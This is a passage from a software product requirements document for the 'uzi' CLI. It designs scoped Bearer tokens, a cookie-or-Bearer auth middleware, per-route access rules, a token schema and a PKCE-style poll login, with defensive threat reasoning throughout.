# PRD #64: uzi CLI — terminal control of the factory for humans and agents

**GitLab Issue**: [#64](https://gitlab.example.com/vtmocanu/uzi/-/issues/64)
**Status**: Complete (implemented 2026-07-17, merged to main 2026-07-18 via MR !67; all 11 milestones landed, reviewed, and live-validated)
**Priority**: Medium
**Created**: 2026-07-17
**Depends on**: PRD #1 (auth/session — the chokepoint this brokers off), PRD #4 (workers/runs), PRD #45 (OIDC — the *other* login that converges on the same chokepoint), PRD #52 (CI shape + `v*` tag releases, which the CLI now rides).
**Related**: PRD #58 (hosted k8s workers) — its M1 is merged to `main` while its M2 route delta is not, so this PRD's `handler.go` edits rebase onto post-#58 `main`; hosted provisioning is deliberately **out** of `uzi worker` for v1 (see Risks). PRD #16 (agent skills) — the *server-side* skills system, which the CLI's bundled skill deliberately shares **no code** with. PRD #32 (vault) — a locked vault parks CLI-created runs, see Risks.

## Problem

uzi has exactly one surface: the browser. Every action — see what a run is doing, approve a
plan gate, retry a failure, check whether a worker is alive — requires a human at a tab. That
hurts twice:

1. **Humans** context-switch out of the terminal where the actual work is, to click a button.
2. **Agents cannot drive uzi at all.** The one credential that is not a browser cookie is the
   worker join token, and it only reaches `/api/worker/*` — a protocol for *executing* runs, not
   for *managing* them. An agent (or a CI job, or a script) has no way to ask "what is queued?"
   or "start a run on issue #12". uzi is an AI dark factory whose control plane is unreachable by
   the AI.

The gap is a credential, not a UI: `RequireAuth` (`api/internal/middleware/auth.go:42`) is
**cookie-only** — it reads `r.Cookie(auth.AuthCookieName)` at `:45` and no Bearer path exists —
and it enforces CSRF on state-changing methods at `:51`. Cookies are `SameSite=Strict` and the
CSRF token is HMAC-bound to the JWT (`api/internal/auth/cookie.go:48,85`). None of that is
usable headless.

## Solution Overview

A **`uzi` CLI**, shipped in this repo, installed via the existing `vtmocanu/homebrew-tap`, driven
identically by humans (tables on a TTY) and agents (`--json`, documented exit codes).

1. **One new credential type**: a `uzc_` / `uza_` CLI token — Bearer, sha256 at rest, mirroring
   the `jointoken` posture that already works for workers.
2. **One new middleware**, `RequireUser`, that dispatches cookie-vs-Bearer and populates the
   **same** `userKey` every existing handler already reads. **No parallel route tree** — but the
   swap is decided **per route, not per group**, and M2 splits existing groups to achieve that
   (see the route-disposition table; "swap the groups" would hand a Bearer token a PAT-writing
   endpoint).
3. **Two acquisition paths, one credential**: a static token minted in the webui (the agent/CI
   path) and a browser-brokered `uzi login` (the human path). Both mint the same row.
4. **The CLI is not an OIDC client.** It brokers a token off uzi's existing session chokepoint —
   which password **and** OIDC already converge on — so it inherits every current and future
   login method with no IdP configuration.
5. **A bundled, self-upgrading skill** (`go:embed` → `~/.claude/skills/uzi-cli/`) so agents always
   know how to drive the *installed* CLI.
6. **Admin read-only verbs** over the CLI; every admin write stays cookie-only, enforced by
   routing.

### Inspiration check (per CLAUDE.md, audited 2026-07-17 against submodule **source**, not READMEs)

| Concern | bottega does | multica does | dot-agent-deck does | uzi will do |
|---|---|---|---|---|
| CLI exists at all | Nothing (no `cmd/`, no CLI) | **Go CLI, cobra**, `server/cmd/multica/` — 28 non-test command files, in the **same repo as the server**, importing `server/internal/…` directly (`cmd_auth.go:21`) | Is itself a Rust binary; no server/auth surface | Go + cobra at **`api/cmd/uzi/`, same repo + same module** — multica's shape, adopted wholesale. **This row reversed our original separate-repo decision** (Decision Log 11) |
| Browser login | N/A | Loopback listener receives a **session JWT in a URL query param**, then spends it on `POST /api/tokens` (`cmd_auth.go:300-330`). Needs `resolveCallbackBinding` topology heuristics, a `detectOutboundIP` UDP-dial trick, a `--callback-host` escape hatch, `tcp4` pinning (macOS IPv6 bug), and printed `ssh -L` instructions because **it breaks over SSH**; binds `0.0.0.0` on LAN | N/A | **Poll, no listener**: the browser only *approves*; the CLI polls for the mint. No port, no binding heuristics, no tunnel, no token in a URL — **works over SSH and in containers, where multica's does not** |
| Redirect safety | N/A | `validateCliCallback` allows loopback **and any RFC 1918 address** (`packages/views/auth/login-page.tsx:80-94`) ⇒ the login page hands a **full session JWT** to any private-network address in the URL — **the weakness to avoid** | N/A | **No redirect target exists.** A session JWT never leaves the browser; PRD #45 Decision 3's closed open-redirect stays closed |
| Credential model | N/A | **Browser login mints a 90-day PAT, not a session** — one credential, two acquisition paths | N/A | **Same model, reached independently, then confirmed against their source** |
| Token table | N/A | `personal_access_token` with `token_prefix`, `revoked`, `last_used_at`, `expires_at`; index `(user_id, revoked)` (`server/migrations/011_*.sql`) | N/A | Same shape — **`token_prefix` + `revoked` beat uzi's own `workers` table** (`token_hash` only, `00020_workers_runs.sql:13`) — **plus a `scope` column multica lacks** (they have no read-only-admin class) |
| Prefix convention | N/A | `mul_` (user) / `mcn_` (cloud node) / `awt_` (webhook) — **prefix per credential class** | N/A | `uzc_` (user) / `uza_` (admin-read); uzi's own `uzw_` (worker) already fits the convention |
| Auth dispatch | N/A | One `Authorization` header, prefix-branched `mcn_`/`mul_`/JWT (`server/internal/middleware/auth.go:119,157`) | N/A | **Same** — presence-dispatch in `RequireUser` |
| Agent-facing docs | N/A | `CLI_INSTALL.md` — agent fetches it **from GitHub `main`** (`:10`), so it describes main, **not the installed binary**; needs a public repo | N/A | **`go:embed`ed skill ships inside the binary** ⇒ skew structurally impossible, works offline, works for a **private** repo (multica's approach is unusable for us). Their *content* shape is stolen |
| Skill drift control | N/A | `references/*-source-map.md` — every claim traced to `file:line`, kept current by a same-PR rule (**manual discipline**) | N/A | **A test**: our skill documents our own cobra tree, so CI asserts every documented command/flag exists. **Mechanical where theirs is manual**; they cannot do this (their skills describe a different layer) |
| Self-update | N/A | `multica update` → `IsBrewInstall()` → shells out to `brew upgrade` (`cmd_update.go:48`); earns its keep only because they also ship tarballs + PowerShell | Public brew tap; no self-update | **Rejected** — brew is our only channel, so it would be a pure alias for `brew upgrade uzi-cli` |
| Token in shell history | N/A | `--token` with a `NoOptDefVal` sentinel prompts when valueless (`cmd_login.go:47`); exists to preserve a **legacy** form | N/A | Same protection, no legacy: `uzi auth token` reads stdin when piped, prompts on a TTY |

**Net**: multica is real prior art and we converge on its credential model. We **beat** it on the
browser transport, on agent docs, and on skill drift. We **lose** on nothing — because the one
place we lost (contract coupling, where their same-repo CLI imports server internals for free)
is exactly what this PRD adopted after that finding reversed our repo decision.

## Technical Design

### Auth: the measured surface this must fit

| Middleware | Credential | CSRF | Context key |
|---|---|---|---|
| `RequireAuth` (`middleware/auth.go:42`) | JWT cookie **only** (`:45`) | yes, on writes (`:51`) | `userKey` (`:18`) |
| `RequireWorker` (`middleware/worker_auth.go:36`) | Bearer join token, sha256 | no — a held secret is not an ambient cookie | `workerKey` (`:12`) |
| **`RequireUser` (new)** | **cookie OR Bearer CLI token** | cookie path only | **`userKey`** |

`RequireUser` populating `userKey` is the load-bearing choice: every endpoint the CLI wants
already reads `mw.UserFromContext` (`CreateRunInput` at `handler/workers.go:627`, `CreateWorker`
at `:360`), so anything else means rewriting handlers.

**The dispatch is a single explicit branch on header *presence*, never a fallback-on-failure:**

```
Authorization present  → CLI-token path ONLY (sha256 → cli_tokens → users; no CSRF; cookie ignored)
otherwise              → existing RequireAuth cookie path, byte-identical (CSRF enforced)
```

"Try cookie, on failure try Bearer" (or the reverse) is the classic CSRF-bypass shape — an
attacker adds a junk `Authorization` header to skip the CSRF-checked branch. Presence-dispatch
makes each request take exactly one path. `RequireAuth` itself is **not modified**; `RequireUser`
composes above it, so the existing `auth_test.go` suite still pins the browser path unchanged.

**Precise dispatch wording** (it must match what gets built): the branch is taken on
`jointoken.FromAuthorizationHeader(...)` returning `ok` — i.e. an `Authorization` header **that
parses as `Bearer <non-empty>`**. This is dispatch-on-**parse**, not on raw presence: an
`Authorization: Basic …` header falls to the **cookie** path, which is still CSRF-enforced and
therefore safe. Say it this way in code review; "presence" is a useful shorthand that is not
literally true.

#### The token's reach: `scope` must be enforced in the middleware, not just at `/api/admin/*`

**This is the correction that matters most in this PRD, and it invalidates an earlier version of
this design.** It is not enough for `RequireAdminRO` to consult `scope`, because `IsAdmin` is
consulted by **owner-or-admin handlers outside `/api/admin/*`** that live in the swapped groups.
Measured:

- `workersvc.GetRunForViewer` (`api/internal/workersvc/service.go:1379-1391`):
  `if isAdmin { return GetRunByID(runID) }` ⇒ **any user's run**.
- `workersvc.ListRunMessagesForViewer` (`:1395-1399`) funnels through it ⇒ **any user's full
  agent transcript** (plans, diffs, tool output).
- `handler.PatchRepo` (`api/internal/handler/forge.go:620-631`) branches `if user.IsAdmin` to the
  **unscoped** `SetRepoSkillsEnabled` *and* `SetRepoDevboxOptIn` ⇒ **two admin writes outside
  `/api/admin/*`**, on any user's repo. `repo_skills_enabled` is guardrail-adjacent: it gates
  whether a clone's `.claude/skills/` reaches the agent.

So an admin's **default-scope `uzc_`** — the very token this PRD tells you to hand a CI job —
would read every user's transcripts and write any user's repo config. **The fix is in
`RequireUser`, ~3 lines**, using the leverage the design already relies on (admin-ness is read
live from the row, never from the credential):

> When the presented credential is a CLI token with `scope != 'admin_ro'`, put a **copy** of the
> user row with **`IsAdmin=false`** into the context.

Every owner-or-admin handler then degrades to owner-only **for free, with zero handler changes**;
`RequireAdminRO` reduces to an `IsAdmin` check on the context user. Sessions are untouched. This
is what makes `scope` a real ceiling rather than a label.

*(This block measured the consumers as of the group-swap design: two run reads + `PatchRepo`.
Decision 21 later swapped `GET /api/runs/{id}/review`, adding **`GetReviewForTarget`** as a third
owner-or-admin **read**, and `PatchRepo` became cookie-only — so the live run-read set the ceiling
test enumerates is now the **trio** `GetRunForViewer` / `ListRunMessagesForViewer` /
`GetReviewForTarget`. The count differs from this paragraph on purpose; the "degrades for free"
property is exactly why the third consumer needed no new fix, only one more line in the test.)*

**Deliberate, ruled consequence**: `GET /api/auth/me` over a `uzc_` token reports
`is_admin:false`. That is correct — it reports *this credential's* effective authority, not the
human's résumé — and `uzi whoami` therefore shows admin only for a `uza_` token. Documented, not
accidental.

#### Route disposition (enumerated per route — **do not swap groups wholesale**)

`api/internal/handler/handler.go:458-557` is **one** `r.Group` with a single `RequireAuth`
(`:459`) that also contains `/api/usage`, `/api/chats/*`, `/api/forge/connections` and `/api/ws`.
Swapping it wholesale would hand a Bearer token `POST /api/forge/connections` (**writes a forge
bot PAT**, `forge.go:141`), `DELETE /api/me/secrets/anthropic_token` (`secrets.go:139` — **no
vault gate**; a stolen token silently disables the victim's entire factory) and `POST /api/chats`
(mints token-spending runs). None of those serve a v1 command. **M2 therefore splits groups so
that only the enumerated routes below get `RequireUser`** — this is real surgery in `handler.go`,
and M2 is scoped accordingly.

| Route | v1 disposition | Why |
|---|---|---|
| `GET /api/auth/me` | **`RequireUser`** | `uzi whoami` |
| `POST /api/auth/logout` | **cookie-only** | shares a group with `/auth/me` (`handler.go:271-275`) but must **split**: logout bumps `token_version`, which would kill the user's **browser** sessions from a CLI call |
| `GET /api/runs`, `GET /api/runs/{id}`, `GET /api/runs/{id}/messages`, `POST /api/runs/{id}/inputs` | **`RequireUser`** | the core loop: list/get/logs/approve/reject/cancel/follow-up |
| `GET /api/runs/{id}/review` | **`RequireUser`** | `uzi run review` (Decision 21). A pure read whose payload — verdict + a fixed-taxonomy recommendation list — is *more* machine-actionable than human-readable; the agent path is the point. **Adds a third admin-widening consumer to the swapped set** (`GetReviewForTarget`, `handler/judge.go:154`), so the ceiling test below is a trio, not a pair |
| `POST /api/runs/{id}/rejudge` | cookie-only | no v1 verb — it **mints a token-spending run**. Excluded on the read-vs-spend distinction (Decision 21), not by inheritance from the row above. **M2 must pin this with a Bearer-reject test** — after the `/review` swap it is the only cookie-only route left in the `/runs` group |
| `GET /api/repos`, `POST /api/repos/{id}/runs` | **`RequireUser`** | `uzi repo list`, `uzi run create` |
| `PATCH /api/repos/{id}`, `PUT /api/repos/{id}`, tool-profile, board, issues, sync, ci-fix-runs | cookie-only | no v1 verb; `PATCH` is also the F1 admin-write path |
| `GET /api/workers`, `DELETE /api/workers/{id}` | **`RequireUser`** | `uzi worker list` / `uzi worker rm`. **`DELETE` stays swapped deliberately**: destroying a worker cannot exfiltrate anything, and the loss is the owner's own (their worker stops; runs requeue) — the asymmetry with `POST` is *mint vs unmint*, not *read vs write*. Stated rather than inherited, per Decision 15(d) |
| **`POST /api/workers`** | **cookie-only** | **mints a plaintext `uzw_` join token** (`handler/workers.go:394-397`) — see below. `uzi worker create` is a webui action |
| `/api/admin/*` **9 GETs** | **`RequireUser` + `RequireAdminRO`** | admin reads |
| `/api/admin/*` **4 writes** | cookie-only | Decision 5 |
| `/api/me/cli-tokens` (all 3) | **cookie-only** | see below |
| `/api/vault/*` | cookie-only | the password surface |
| `/api/me/secrets/*` | cookie-only | `DELETE anthropic_token` has no vault gate; a stolen token would kill the factory |
| `/api/forge/*` | cookie-only | `POST /connections` writes a bot PAT |
| `/api/chats/*`, `/api/usage`, `/api/notifications`, `/api/me/settings`, `/api/me/slack`, `/api/me/autopilot`, `/api/me/judge`, `/api/me/rate-limits`, `/api/agent-templates`, `/api/skills`, `/api/tool-allowlist` | cookie-only | no v1 verb — least privilege: the surface widens when a verb needs it, not before |
| `/api/ws` | **cookie-only** | WS-follow is deferred (Out of scope); swapping it would widen the surface for a client that does not exist. **`handler/ws.go:26-28`'s comment asserts it "runs inside the session-authenticated group" — leaving it unswapped keeps that comment true.** |

**Note the earlier draft's category error**: "`/api/me/*` (except vault)" is vacuous —
`/api/vault/*` is its **own** route (`handler.go:292`), never under `/api/me/`. The carve-out
protected nothing. Enumeration replaces it.

**`POST /api/workers` is cookie-only because it mints a credential that reads secrets in
plaintext.** It returns the join token in the clear (`handler/workers.go:394-397`), and a `uzw_`
is the key to the worker protocol: register → `POST /api/worker/runs/claim` → the claim response
carries `ClaimSecrets`, whose own comment reads *"the **decrypted** secrets for this run only"* —
`ForgeUsername`, **`ForgePAT`**, **`AnthropicOAuthToken`** (`workersvc/claim.go:120-129`). The
preconditions are just the normal operating state: vault unlocked, a forge connection, an enabled
repo. So a **non-admin** `uzc_` — the token this PRD tells you to hand a CI job — could exfiltrate
a forge PAT and a paid API credential **over HTTPS**, defeating exactly what `secretbox` and PRD
#32's vault exist to defend (PRD #32's premise is that a DB dump plus every env var cannot recover
the token; this recovers it by asking). Worse, it **outlives its parent**: the `uzw_`, the PAT and
the Anthropic token all survive revoking the `uzc_`, converting a revocable uzi-scoped credential
into persistent access to a third-party forge and someone's Anthropic budget. Guardrail 1 holds
(the PAT is Developer-role and `main` is protected), but private source and the budget do not.

**This inverts the table's own logic, which is why it is called out rather than quietly fixed**:
`/api/forge/*` is excluded because `POST /connections` *writes* a bot PAT, and `/api/me/secrets/*`
because `DELETE anthropic_token` is a factory kill. **Reading a PAT is strictly worse than writing
one, and exfiltration is strictly worse than DoS.** Decision Log 16 made this exact escalation
argument for `/api/me/cli-tokens` and this draft failed to apply it one row down — and it is the
worse case: `uzc_` minting `uzc_` is *lateral*, `uzc_` minting `uzw_` is **upward**.

**`/api/me/cli-tokens` is cookie-only, deliberately.** If a CLI token could reach the token CRUD:
a stolen `uzc_` mints replacements (revocation becomes whack-a-mole), and an admin's stolen
user-scope token mints a `uza_` — **escalating past the ceiling**, because the mint check keys off
the *user*, not the presenting credential's scope. Consequence: **`uzi logout` is local-only** —
it deletes the stored credential and says so; revoking server-side is a webui action, and
`uzi logout --help` points there. *(Rejected for v1: a Bearer-reachable
`DELETE /api/me/cli-tokens/self`. It is defensible — self-revoke cannot escalate — but it is a
new endpoint serving one verb, and "revoke in the webui" is honest and already built. Revisit if
users ask.)*

### Admin: read/write split by routing, reach gated by scope

Routing and scope are orthogonal: **routing enforces read-only**, **scope enforces which tokens
reach admin at all**. Both are required. Verbs re-derived from `handler/handler.go:424-453` on
`main` — **9 reads, 4 writes**:

```go
r.Route("/admin", func(r chi.Router) {
    r.Group(func(r chi.Router) {           // READS: session OR an admin-scoped CLI token
        r.Use(mw.RequireUser(h.q, h.cfg))
        r.Use(mw.RequireAdminRO)           // JUST user.IsAdmin — the RequireUser masking already
                                           // reduced a non-admin_ro token to IsAdmin=false. Do NOT
                                           // re-check scope here: it would need RequireUser to
                                           // export scope into context, and a second check can
                                           // drift from the masking. One mechanism, one place.
        r.Get("/users", h.ListUsers)
        r.Get("/settings", h.GetSettings)
        r.Get("/vault-migration", h.VaultMigration)
        r.Get("/slack/status", h.GetAdminSlackStatus)
        r.Get("/workers", h.AdminListWorkers)
        r.Get("/runs", h.AdminListRuns)
        r.Get("/usage", h.AdminUsage)
        r.Get("/rate-limits", h.AdminRateLimits)
        r.Get("/selfimprove", h.GetSelfimproveConfig)
    })
    r.Group(func(r chi.Router) {           // WRITES: cookie-only, unchanged
        r.Use(mw.RequireAuth(h.q, h.cfg))
        r.Use(mw.RequireAdmin)
        r.Patch("/users/{id}", h.PatchUser)
        r.Put("/users/{id}/judge", h.SetUserJudgeEnabled)
        r.Put("/settings", h.UpdateSettings)
        r.Put("/selfimprove", h.PutSelfimproveConfig)
    })
})
```

This makes "a read-only-admin token reaches a write handler" **structurally impossible** rather
than policy-checked: the write group's `RequireAuth` is cookie-only, so a Bearer request is
rejected by the middleware chain before any handler exists to hold a flag.

**Admin-ness resolves live, never from the credential.** `RequireAdmin` reads
`UserFromContext(ctx).IsAdmin` (`middleware/auth.go:116-129`) and `RequireAuth` loads that user
**fresh per request** (`:68`). `RequireUser` does the same via `cli_tokens.user_id`. Therefore
**demoting an admin instantly neuters their `uza_` token** — no revocation step, no cache to
bust. **Scope is a ceiling, not a grant**: `admin_ro && !user.IsAdmin` ⇒ refused, and — per the
`IsAdmin=false` context copy above — `!admin_ro` ⇒ the request is indistinguishable from a
non-admin's **everywhere**, not merely under `/api/admin/*`. Without that copy, `scope` would be
a label on the admin routes and nothing more; the two mechanisms are one design.

### Storage (migrations drafted as `00067`/`00068` — **draft numbers**, final assigned at merge time, next free above the live head, per the CLAUDE.md convention)

Head is `00066_hosted_workers.sql` (PRD #58's, already on `main`); #58's open branch adds no
further migrations, so `00067` is free — verified on **`main` at `ce3f2dd`**, and against the
**PRD #58 feature branch** (`feature/prd-58-hosted-k8s-workers`), which adds none. Both refs are
named deliberately: the renumber check at landing is against **`main`'s** head, not a feature
branch's. Renumber at the landing rebase —
the boot runner is strict goose (`api/internal/store/migrate.go`), and a version landing below an
applied head bricks every upgraded instance.

```sql
CREATE TABLE cli_tokens (
    id           uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id      uuid NOT NULL REFERENCES users ON DELETE CASCADE,
    name         text NOT NULL,
    token_hash   bytea NOT NULL UNIQUE,          -- sha256(uzc_…/uza_…), mirrors workers.token_hash
    token_prefix text NOT NULL,                  -- "uzc_a1b2…" display stub (multica 011)
    scope        text NOT NULL DEFAULT 'user'
                 CHECK (scope IN ('user','admin_ro')),
    revoked      boolean NOT NULL DEFAULT false, -- soft delete: keeps the incident trail
    created_at   timestamptz NOT NULL DEFAULT now(),
    last_used_at timestamptz,
    last_used_ip inet,                           -- the only detection control; same ≤1/min write
    expires_at   timestamptz                     -- server-set; see the expiry matrix
);
CREATE INDEX idx_cli_tokens_user ON cli_tokens (user_id, revoked);

CREATE TABLE cli_auth_requests (
    id             uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    code_challenge text NOT NULL,                -- base64url(S256(verifier))
    client_desc    text NOT NULL,                -- hostname/os, shown on the consent screen
    user_code      text NOT NULL UNIQUE,         -- anti-phishing confirmation code
    status         text NOT NULL DEFAULT 'pending'
                   CHECK (status IN ('pending','approved','denied','consumed')),
    user_id        uuid REFERENCES users ON DELETE CASCADE,   -- set at approve
    scope          text NOT NULL DEFAULT 'user'
                   CHECK (scope IN ('user','admin_ro')),      -- chosen on the consent screen
    created_at     timestamptz NOT NULL DEFAULT now(),
    expires_at     timestamptz NOT NULL          -- ~5 min
);
```

`token_prefix` and `revoked` are lifted from multica's `personal_access_token`; both **beat uzi's
own `workers` precedent**, which stores `token_hash` alone and hard-deletes. The divergence is
deliberate: a worker is disposable infrastructure, a PAT is a human-held credential with an
incident story. `scope` has **no safe retrofit** (see Decision Log 7), so it lands now.

**Three implementation details that are easy to get wrong and expensive to get wrong:**

1. **The NULL trap.** The token lookup must be
   `WHERE token_hash = $1 AND NOT revoked AND (expires_at IS NULL OR expires_at > now())`.
   A bare `expires_at > now()` evaluates to NULL — hence *false* — for exactly the
   never-expiring webui-minted `uzc_`, i.e. it would silently reject **the agent/CI token the NULL
   exists to protect**. Fail-closed, but landing precisely on the path this PRD is for.
2. **`last_used_at` + `last_used_ip` must be coarse — one write, both columns.** A write per
   request would put a DB write on every CLI call against a **single-replica** api. Update at most
   once per minute per token (skip when `last_used_at > now() - interval '1 minute'`), setting
   **both** columns in that same statement. `last_used_ip` therefore costs nothing beyond the write
   already mandated. Accepted precision limit, worth knowing before anyone trusts it: at ≤1/min
   granularity the column records *an* IP that used the token in that window, not every IP — it is
   a **signal for a human deciding whether to revoke**, not an audit log, and Risk 8 still concedes
   there is no audit log.
3. **`cli_auth_requests` needs a sweeper.** Rows are short-lived but nothing deletes them.
   Opportunistic `DELETE … WHERE expires_at < now()` in the `start` handler, and/or fold into the
   existing sweeper goroutine — the repo already has that precedent for stale runs.

**Expiry matrix** — read it as *"90 days, unless it is a webui-minted `user`-scope token"*:

| Token | Mint path | Default `expires_at` | Why |
|---|---|---|---|
| `uzc_` (user) | webui static | **none** (NULL) | The **agent/CI path**. A token dying silently mid-pipeline is the one footgun this path cannot absorb. |
| `uzc_` (user) | browser (`uzi login`) | **90 days** | Human-held; re-running `uzi login` is trivial, so a bounded lifetime is free security. Matches multica. |
| `uza_` (`admin_ro`) | **either** | **90 days** | **Scope wins over acquisition path** — the only control bounding a *stolen* factory-wide-read token. |

**The server sets every lifetime; the client never proposes one.** multica hardcodes
`expiresInDays := 90` in the *CLI* (`cmd_auth.go:321`) — a client choosing its own credential
lifetime is backwards.

### Auth flow: browser-brokered, poll-based (no loopback listener)

```mermaid
sequenceDiagram
    participant C as uzi CLI
    participant B as Browser (SPA)
    participant A as uzi api
    C->>C: verifier = rand(32); challenge = S256(verifier)
    C->>A: POST /api/auth/cli/start {challenge, client_desc}
    A-->>C: {request_id, user_code, expires_in, interval}
    C->>C: print user_code; open browser
    C->>B: <frontend>/cli-auth?request=<request_id>
    B->>A: GET /api/auth/cli/request/{id}   (RequireAuth — password OR OIDC login happens HERE)
    A-->>B: {client_desc, user_code, expires_at}
    Note over B: user TYPES the user_code shown by the CLI, picks scope, approves
    B->>A: POST /api/auth/cli/approve {request_id, user_code, scope}   (RequireAuth + CSRF + per-user limiter)
    A->>A: status=approved, user_id=<session user>   (NO token minted yet)
    loop every `interval` until expiry
        C->>A: POST /api/auth/cli/poll {request_id, verifier}
        A-->>C: 202 {status:"pending"}
    end
    A->>A: verify S256(verifier)==challenge; mint token; INSERT cli_tokens; status=consumed
    A-->>C: 200 {token, user}   (once, ever)
```

**No plaintext token is ever stored, not even sealed**: `approve` only marks the row; the token
is minted **inside the poll transaction** and returned once. (Rejected: mint-at-approve holding
`secretbox(token)` for ≤5 min — legitimate, since it is the sealed-state-cookie posture at
`handler/oidc.go:486`, but strictly worse: this way a DB dump contains no CLI token in any form.)

**The mint must be claim-first, not read-then-write.** "Inside a transaction" is **not**
sufficient under READ COMMITTED: two concurrent polls can both `SELECT status='approved'`, both
mint, and both mark `consumed` — **two tokens from one approval**, and a single-threaded test
would never see it. uzi already has this pattern twice (`FOR UPDATE SKIP LOCKED` for run claims;
ARCHITECTURE.md's claim-first rule for proposals). The claim **is** the guard:

```sql
UPDATE cli_auth_requests
   SET status = 'consumed'
 WHERE id = $1 AND status = 'approved' AND expires_at > now()
RETURNING code_challenge, user_id, scope;
```
Mint **only** on a returned row; zero rows ⇒ 410. Verify `S256(verifier) == code_challenge` in the
same transaction and **roll back on mismatch**, leaving the row exactly as it was. (`expires_at`
here is `NOT NULL` on this table, so the NULL trap noted for `cli_tokens` does not apply.)

**On mismatch, do NOT mark the request `denied`** — return 4xx, touch no state, `slog.Warn` for the
signal. An earlier draft said both "roll back" *and* "mark denied", which **cannot both happen**:
the rollback undoes the marking, so a coder would have flipped a coin and half the outcomes would
be a login-DoS. And the marking buys nothing — the verifier is 32 random bytes, so there is no
brute-force to harden against; that is what the PKCE binding already does. It **costs**: the
`request_id` is **not a secret** (it rides the browser URL at `/cli-auth?request=<id>`, browser
history, and the SPA's `GET /api/auth/cli/request/{id}` access logs), so anyone who learns one
could poll with a junk verifier and kill a victim's in-flight `uzi login`. Rolling back keeps the
legitimate poll alive.

**`user_code` — what it does and does not buy.** It lets the user confirm the tab belongs to
**their** invocation rather than a process that raced a `uzi login`. It defeats **asynchronous**
phishing only; RFC 8628 §5.4 says plainly that this "does not prevent a phisher … interacting
with the user in real time". See Risk 10. **The consent screen requires the user to *type* the
code**, not merely compare it — strictly stronger for the same UI cost, and it interrupts the
approve-the-tab reflex that auto-opening a browser trains.

**`user_code` shape (specified, because "UNIQUE on a display column" invites 4 digits)**: 8
characters from **Crockford base32** (`0-9A-Z` minus `I`,`L`,`O`,`U` — unambiguous when read aloud
or retyped), rendered `XXXX-XXXX`. That is ~40 bits, comfortably above RFC 8628's own example
(8 chars base20 ≈ 34.6 bits). It is a **display + typing** credential, not the security boundary —
the `code_verifier` is.

⚠️ **The invariant that makes 40 bits sufficient, stated so nobody crosses it silently**: the
`user_code` is only ever a **confirmation checked alongside a `request_id`** the client already
holds — `poll` takes `{request_id, verifier}` and never the code, so its only guess surface is
`approve` (authenticated + rate-limited). **If anyone later adds the canonical device-flow entry
point ("enter your code at /device"), the code becomes a *lookup key*** and its entropy becomes
the whole boundary — that endpoint would then need its own rate limit, and 40 bits reconsidered.
Do not add it casually.

`UNIQUE` on `user_code` makes a collision a **loud insert failure** rather than a silent
cross-wire. Negligible is not never (~40 bits, ≤5-minute window), and the failure mode would be a
500 on `start`, so **retry the insert on a unique violation** (a few attempts, fresh code each
time) instead of propagating it.

**`token_prefix` length**: store **4** characters after the underscore (e.g. `uzc_a1b2…`).
`jointoken` encodes with `base64.RawURLEncoding` (`jointoken.go:37`) and `clitoken` mirrors it, so
4 characters = **24 bits**, leaving **2^232** of a 256-bit token — no meaningful reduction — while
being enough to identify a row in a list.

### API delta

Naming follows the measured conventions — flows under `/api/auth/*` like `/api/auth/oidc/*`,
per-user resources under `/api/me/*` like `/api/me/secrets`.

| Route | Auth | Notes |
|---|---|---|
| `POST /api/auth/cli/start` | none, `authLimiter` | → `{request_id, user_code, expires_in, interval}` |
| `POST /api/auth/cli/poll` | none, **`cliPollLimiter` (new)** | 202 pending / 200 `{token,user}` **once** / 410 expired. POST not GET: the verifier must never land in access logs |
| `GET /api/auth/cli/request/{id}` | `RequireAuth` | consent-screen metadata |
| `POST /api/auth/cli/approve` | `RequireAuth` + CSRF + **`authLimiter.PerUserMiddleware`** | marks approved; **mints nothing**. The limiter is new-and-necessary: making the user *type* the `user_code` turned this into a **credential-checking** endpoint, which it was not when the code was compare-only. uzi already limits exactly this shape for exactly this reason — vault unlock rides the per-user limiter because it is "a password-guessing surface" (`handler.go:294`) |
| `POST /api/auth/cli/deny` | `RequireAuth` + CSRF | |
| `GET /api/me/cli-tokens` | `RequireAuth` (**cookie-only, deliberate**) | list; metadata only, never values. **Must return `token_prefix` + `last_used_at`** — see below |
| `POST /api/me/cli-tokens` | `RequireAuth` + CSRF (**cookie-only**) | static path; plaintext returned **once**, like `CreateWorker` (`handler/workers.go:394`) |
| `DELETE /api/me/cli-tokens/{id}` | `RequireAuth` + CSRF (**cookie-only**) | sets `revoked=true` |
| `POST /api/me/cli-tokens/revoke-all` | `RequireAuth` + CSRF (**cookie-only**) | **the panic button.** `UPDATE cli_tokens SET revoked=true WHERE user_id=$1 AND NOT revoked` — one query over the index the schema already has |

**`token_prefix` + `last_used_at` + `last_used_ip` are the forensic surface, not decoration.**
There is no per-request audit log for CLI tokens (Risk 8), and a password change does not revoke
them (Decision Log 6). So when an admin asks "which of my tokens is this, and has it been used
since the laptop was lost?", **those columns are the entire answer**. That is why the list
endpoint returns them and why M6's UI renders them — an implementation that drops any of them as
"just metadata" removes the only incident-response affordance the design has.

**`last_used_ip` exists because `last_used_at` answers the wrong question.** *(User ruling, final
round.)* `last_used_at` + `token_prefix` answer *"was it used?"* — but the question that actually
drives the revoke decision is *"was it used by someone who isn't me?"*, and **a legitimately-used
token and a stolen-and-used one are byte-identical on that list without it**. It is also the
**only detection control in the design**, which Risk 8 explicitly concedes it otherwise lacks:
per-request audit logging is out of scope, and this is the midpoint between that and nothing.
Cost is genuinely zero-marginal: a nullable `inet` written on **the same coarse ≤1/min update
already mandated** — no new mechanism, no new write, no new endpoint. Use `ClientIP(r,
trustedProxies)` (`middleware/ratelimit.go`), the same helper the limiters use, so the
`TRUSTED_PROXIES` semantics are not re-invented.

**`POST /api/me/cli-tokens/revoke-all` exists because a warning is not a control.** *(User ruling,
final round.)* Risk 8's own logic forces it: with no-expiry and `token_version`-exemption both
ruled in, **explicit revocation is the only control that remains** — and the PRD left it as a
manual, N-click enumeration with the warning *"you must enumerate and revoke each one"* repeated
twice. That sentence describes precisely the workflow that fails at 3am with a lost laptop.
Repeating a warning is not a control; one button is. One query, one index that already exists, one
button on the list M6 is already building.

**`poll` gets its own limiter, and this is a correctness requirement, not tidiness.**
`authLimiter` is **10 requests/minute** keyed on `(URL path, client IP)`
(`api/internal/config/config.go:406-407`, `middleware/ratelimit.go:82-92`). An RFC 8628 poll at
the conventional 5s interval is 12/min, so `uzi login` would **trip its own rate limit at poll
#11 at default config** — and every caller behind one NAT shares the bucket. So: a dedicated
`cliPollLimiter`, sized so the server-returned `interval` cannot exceed it (the two are one
decision — if `interval` is 5s the budget must comfortably exceed 12/min). `Routes()` gains an
